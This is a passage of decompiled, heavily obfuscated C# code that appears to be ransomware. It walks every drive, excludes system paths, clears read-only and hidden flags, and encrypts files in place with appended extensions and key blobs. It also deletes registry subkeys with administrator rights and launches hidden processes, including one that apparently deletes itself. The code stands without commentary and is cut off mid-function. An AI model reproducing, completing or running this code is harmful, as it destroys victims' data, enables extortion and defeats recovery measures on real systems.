					if (!fileInfo.FullName.Contains(getString_0(107388139)) && !fileInfo.FullName.Contains(getString_0(107388090)) && !fileInfo.FullName.Contains(getString_0(107388105)) && !fileInfo.FullName.Contains(getString_0(107388056)) && !fileInfo.FullName.Contains(getString_0(107388071)) && !fileInfo.FullName.Contains(getString_0(107388022)) && !fileInfo.FullName.Contains(getString_0(107388037)) && !fileInfo.FullName.Contains(getString_0(107388500)) && !fileInfo.FullName.Contains(getString_0(107388519)) && !fileInfo.FullName.Contains(getString_0(107388466)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388485)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388440)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388455)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388406)) && !fileInfo.FullName.Contains(GwTsezEgVAuVAU(getString_0(107388421))) && !fileInfo.FullName.Contains(getString_0(107388396)) && !fileInfo.FullName.Contains(getString_0(107397187)) && !fileInfo.FullName.Contains(getString_0(107388383)) && !fileInfo.FullName.EndsWith(getString_0(107395435)) && !fileInfo.FullName.EndsWith(getString_0(107388358)) && !fileInfo.FullName.EndsWith(getString_0(107388353)) && !fileInfo.FullName.EndsWith(getString_0(107388316)) && !fileInfo.FullName.EndsWith(getString_0(107388311)) && !fileInfo.FullName.Contains(getString_0(107388306)) && !fileInfo.FullName.Contains(LIbWxYpDOmPy) && !fileInfo.FullName.Contains(jnRLNtXuRRg) && !fileInfo.FullName.Contains(diaHTfOFnw))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(cJvZgRMCiiT) * 1024.0 * 1024.0 && kvJFoDYMuC == getString_0(107396855))
						{
							list.Add(fileInfo.FullName);
							buzqaFKfnRF(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && kvJFoDYMuC == getString_0(107397015))
						{
							list.Add(fileInfo.FullName);
							buzqaFKfnRF(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void GClBSyQehj()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388321));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!HoHveMjVjvX.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387756), getString_0(107397192)).Replace(getString_0(107387751), getString_0(107387756))
					.Replace(getString_0(107387742), getString_0(107388695))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					HoHveMjVjvX.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387756), getString_0(107397192)).Replace(getString_0(107387751), getString_0(107387756))
						.Replace(getString_0(107387742), getString_0(107388695))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387705), getString_0(107388695)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string KXNiSRaxzeIpPt(string MpIHQdZxSklG = "", string EwWvQBHwErAjymKr = "")
	{
		string result = getString_0(107388695);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = MpIHQdZxSklG,
				Arguments = EwWvQBHwErAjymKr,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void xcFsifoFernH(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107387696),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string VSGqbgWciAAQ(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string GwTsezEgVAuVAU(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void AiwyVzAQMcDi(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = GwTsezEgVAuVAU(getString_0(107387711));
		processStartInfo.Arguments = getString_0(107387682) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool BDTFnPeiNCX(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string cYzqjSUrbP(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void UQZfYOBEqlkpb()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = VSGqbgWciAAQ(getString_0(107387677));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387507)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387994)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107388009)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387952)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387711)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387927)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387898)));
					registryKey.Close();
				}
				string_ = VSGqbgWciAAQ(getString_0(107387913));
				registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387816)));
					registryKey.Close();
				}
				string_ = VSGqbgWciAAQ(getString_0(107387767));
				registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387816)));
					registryKey.Close();
				}
				string_ = VSGqbgWciAAQ(getString_0(107387767));
				registryKey = Registry.CurrentUser.OpenSubKey(GwTsezEgVAuVAU(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(getString_0(107387816)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107387782)), GwTsezEgVAuVAU(getString_0(107387221)));
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107387204)), GwTsezEgVAuVAU(getString_0(107387163)));
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107387204)), GwTsezEgVAuVAU(getString_0(107387049)));
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107387500)), GwTsezEgVAuVAU(getString_0(107387451)));
		}
		catch
		{
		}
	}

	public static void KGSDHYAAGYu(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(GwTsezEgVAuVAU(getString_0(107387378)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void NzZJHUVbSXZd()
	{
		string string_ = VSGqbgWciAAQ(getString_0(107387353));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(GwTsezEgVAuVAU(getString_0(107387304)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void yQfvyropwD()
	{
		KXNiSRaxzeIpPt(getString_0(107396997), GwTsezEgVAuVAU(getString_0(107387271)));
		string text = GwTsezEgVAuVAU(getString_0(107386565));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107387742) + text + getString_0(107387742) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396997);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void VmNlRJHbsFKpwZ(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107386500) + string_0 + getString_0(107386971) + ex.Message + getString_0(107396288));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string PAhtGWwudbxozQK()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107388695);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386914);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386905))) ? getString_0(107386919) : getString_0(107386896));
				break;
			case 0:
				text = getString_0(107386942);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386909);
				break;
			case 4:
				text = getString_0(107386864);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386878) : getString_0(107386887));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386854) : getString_0(107386859)) : getString_0(107386832)) : getString_0(107386841));
				break;
			case 10:
				text = getString_0(107386849);
				break;
			}
		}
		if (text != getString_0(107388695))
		{
			text = getString_0(107386812) + text;
			if (oSVersion.ServicePack != getString_0(107388695))
			{
				text = text + getString_0(107386799) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string mpBrVYdLlDe(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395397);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(GwTsezEgVAuVAU(getString_0(107395364)));
				streamWriter.WriteLine(getString_0(107396288));
				streamWriter.WriteLine(GwTsezEgVAuVAU(getString_0(107393418)));
				streamWriter.WriteLine(string_0);
				if (MiZHZrKmtKkaPXn)
				{
					streamWriter.WriteLine(getString_0(107396288));
					streamWriter.WriteLine(GwTsezEgVAuVAU(getString_0(107392764)));
					streamWriter.WriteLine(GyWbmViNanxKl.nFyAFAYBITHjh());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !IooTTsvIiwCN)
				{
					File.AppendAllText(text, getString_0(107392731) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107386826) + ex.Message + getString_0(107396288));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void gwzRtxANhzJ(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		qZMjyZfSuemhC.DCzjcOwiJDl CS_0024_003C_003E8__locals0 = new qZMjyZfSuemhC();
		CS_0024_003C_003E8__locals0.gEhXXIzChk = string_1;
		CS_0024_003C_003E8__locals0.WLgJdVMBruB = string_2;
		CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu = string_3;
		CS_0024_003C_003E8__locals0.sZqoWBfJdvFIl = string_4;
		lrVhqMPbYlaOK = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396504))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !HoHveMjVjvX.Contains(array[i].Name))
					{
						HoHveMjVjvX.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!HoHveMjVjvX.Contains(string_0[j]))
				{
					HoHveMjVjvX.Add(string_0[j]);
				}
			}
		}
		if (HoHveMjVjvX.Contains(GwTsezEgVAuVAU(getString_0(107386737))) && rHeEvpAbjCjyvEaC == getString_0(107396855))
		{
			HoHveMjVjvX.Remove(GwTsezEgVAuVAU(getString_0(107386737)));
		}
		Parallel.ForEach(HoHveMjVjvX, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new qZMjyZfSuemhC.DCzjcOwiJDl();
			CS_0024_003C_003E8__locals0.APrnMdZiEm = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM = string_0;
			if (upflSQRmeWP && !PAhtGWwudbxozQK().Contains(qZMjyZfSuemhC.getString_0(107386888)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						BDTFnPeiNCX(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (iEHeKlEPYHGI == qZMjyZfSuemhC.getString_0(107396865))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.APrnMdZiEm.gEhXXIzChk, CS_0024_003C_003E8__locals0.APrnMdZiEm.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.APrnMdZiEm.WLgJdVMBruB, CS_0024_003C_003E8__locals0.APrnMdZiEm.wxfrhJHvjWjHlu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.gEhXXIzChk, CS_0024_003C_003E8__locals0.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.WLgJdVMBruB, CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu);
			}
		});
	}

	public static void HGTRyKvTZjusOL(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107388695));
		List<string> list3 = list2;
		if (VsxmPTvejQSFs == getString_0(107397015))
		{
			list = bUTxlfgHAvCR(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = RAjgPCVHZF.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((ltuxRtIPjttT == getString_0(107397015) && !item.EndsWith(text)) || yGkMwQPqUdXIj.Contains(item))
				{
					continue;
				}
				if (cySCSfjuDKIn == getString_0(107396855))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(item))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(item);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(item);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (CdQMIPJOkrOUDSy == getString_0(107396855) && fileStream.Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 && !list3.Contains(text))
					{
						if (bxhZXFvKXZl == getString_0(107396855))
						{
							foreach (string item2 in EKjYgfCTgvyfhvOPx)
							{
								if (item.ToLower().EndsWith(item2) && vEWBFQaTPDgk == getString_0(107396855))
								{
									if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && vEWBFQaTPDgk == getString_0(107397015))
								{
									try
									{
										GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = fkozHCDTDrY.OlBXyEPnCYpDO(item, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
						byte[] quwoLGzcjeGYg = fkozHCDTDrY.GVHcoGquozRzL(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						fkozHCDTDrY.wXhdORmUgbGuB(item, quwoLGzcjeGYg);
						if (string_2 != getString_0(107386760))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386760))
					{
						BrOZVHevqxbaV(item, item + string_2, lrVhqMPbYlaOK);
					}
					else
					{
						BrOZVHevqxbaV(item, item + getString_0(107386755), lrVhqMPbYlaOK);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void buzqaFKfnRF(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		kFfBlUyayStE.YUIjdATTEVIX CS_0024_003C_003E8__locals0 = new kFfBlUyayStE();
		CS_0024_003C_003E8__locals0.WNvdcTPDgW = list_0;
		CS_0024_003C_003E8__locals0.ZDxRrpKTbd = string_1;
		CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW = string_2;
		CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ = string_3;
		CS_0024_003C_003E8__locals0.ZfHQdOmNHVP = new List<string> { getString_0(107388695) };
		if (ltuxRtIPjttT == getString_0(107397015))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.WNvdcTPDgW)
				{
					if (CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW.Length != 0)
					{
						string[] dXgeOiXUaNyFEW2 = CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW;
						int num2 = 0;
						while (num2 < dXgeOiXUaNyFEW2.Length)
						{
							string value2 = dXgeOiXUaNyFEW2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09e1;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.ZDxRrpKTbd))
						{
							goto IL_09e1;
						}
					}
					catch (Exception)
					{
						goto IL_09e1;
					}
					if (item.EndsWith(string_0) && !yGkMwQPqUdXIj.Contains(item))
					{
						if (cySCSfjuDKIn == kFfBlUyayStE.getString_0(107396873))
						{
							try
							{
								if (NqaDDCCMEbCxV.SmlSZjnRIeVP(item))
								{
									NqaDDCCMEbCxV.XkoarExxofRiBeK(item);
								}
							}
							catch
							{
							}
						}
						yGkMwQPqUdXIj.Add(item);
						if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
						{
							SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
						}
						VmNlRJHbsFKpwZ(item);
						try
						{
							new vyQYEsUfMyGoFM().rjhwntJsrm(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (qoRjYABduZF)
									{
										Console.WriteLine(kFfBlUyayStE.getString_0(107403564) + item + kFfBlUyayStE.getString_0(107403519) + new FileInfo(item).Length + kFfBlUyayStE.getString_0(107403498));
										Console.WriteLine(kFfBlUyayStE.getString_0(107403489));
									}
								}
								catch
								{
								}
								KXNiSRaxzeIpPt(GwTsezEgVAuVAU(kFfBlUyayStE.getString_0(107403416)), kFfBlUyayStE.getString_0(107387760) + item + kFfBlUyayStE.getString_0(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE.getString_0(107403871)) + kFfBlUyayStE.getString_0(107387760) + Environment.UserName + kFfBlUyayStE.getString_0(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE.getString_0(107403854)));
							}
						}
						catch (Exception ex18)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + item + kFfBlUyayStE.getString_0(107403861) + ex18.Message + kFfBlUyayStE.getString_0(107396306));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex20)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + item + kFfBlUyayStE.getString_0(107403748) + ex20.Message + kFfBlUyayStE.getString_0(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								goto end_IL_02cd_2;
							}
							if (!(CdQMIPJOkrOUDSy == kFfBlUyayStE.getString_0(107396873)) || new FileInfo(item).Length <= Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 || CS_0024_003C_003E8__locals0.ZfHQdOmNHVP.Contains(string_0))
							{
								if (MiZHZrKmtKkaPXn)
								{
									CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
								}
								string text3 = AnLYutpDjmCX.cVQEpGjgoi(32);
								string s3 = FlpXYRWvTX.ZTvekdOmyg(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
								{
									if (!EcdpqbMrQOzfdgL)
									{
										if (!IooTTsvIiwCN)
										{
											GKkFnjoUAoXGqN(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
										}
										else
										{
											GKkFnjoUAoXGqN(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!IooTTsvIiwCN)
											{
												IzvDPVDWsNMZj(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
											}
											else
											{
												IzvDPVDWsNMZj(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (joesCNAxeHUI)
											{
												try
												{
													File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + item + kFfBlUyayStE.getString_0(107386220) + ex22.Message + kFfBlUyayStE.getString_0(107396306));
												}
												catch (Exception)
												{
												}
											}
											iePhSHBTqLd++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!EcdpqbMrQOzfdgL)
								{
									if (!IooTTsvIiwCN)
									{
										GKkFnjoUAoXGqN(item, item + kFfBlUyayStE.getString_0(107386773), lrVhqMPbYlaOK);
									}
									else
									{
										GKkFnjoUAoXGqN(item, item + kFfBlUyayStE.getString_0(107386773), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!IooTTsvIiwCN)
										{
											IzvDPVDWsNMZj(item, item, lrVhqMPbYlaOK);
										}
										else
										{
											IzvDPVDWsNMZj(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (joesCNAxeHUI)
										{
											try
											{
												File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + item + kFfBlUyayStE.getString_0(107386220) + ex25.Message + kFfBlUyayStE.getString_0(107396306));
											}
											catch (Exception)
											{
											}
										}
										iePhSHBTqLd++;
										goto end_IL_02cd_2;
									}
								}
								if (IooTTsvIiwCN)
								{
									if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
									{
										KGSDHYAAGYu(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, bytes3);
									}
									else
									{
										KGSDHYAAGYu(item, bytes3);
									}
								}
								goto IL_09e1;
							}
							CS_0024_003C_003E8__locals0 = new kFfBlUyayStE.knpMjkNPiIY();
							CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
								{
									if (MiZHZrKmtKkaPXn)
									{
										CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd);
								}
							}
							catch (Exception ex27)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + item + kFfBlUyayStE.getString_0(107403687) + ex27.Message + kFfBlUyayStE.getString_0(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = kFfBlUyayStE.getString_0(107388713);
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
							{
								CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
							}
							else
							{
								CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item;
							}
							if (bxhZXFvKXZl == kFfBlUyayStE.getString_0(107396873))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in EKjYgfCTgvyfhvOPx)
									{
										if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == kFfBlUyayStE.knpMjkNPiIY.getString_0(107396876))
										{
											if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX).Length)
											{
												try
												{
													GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.knpMjkNPiIY.getString_0(107389341), kFfBlUyayStE.knpMjkNPiIY.getString_0(107389336), kFfBlUyayStE.knpMjkNPiIY.getString_0(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2) && vEWBFQaTPDgk == kFfBlUyayStE.knpMjkNPiIY.getString_0(107397036))
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.knpMjkNPiIY.getString_0(107389341), kFfBlUyayStE.knpMjkNPiIY.getString_0(107389336), kFfBlUyayStE.knpMjkNPiIY.getString_0(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = AnLYutpDjmCX.cVQEpGjgoi(32);
							string s4 = FlpXYRWvTX.ZTvekdOmyg(text4);
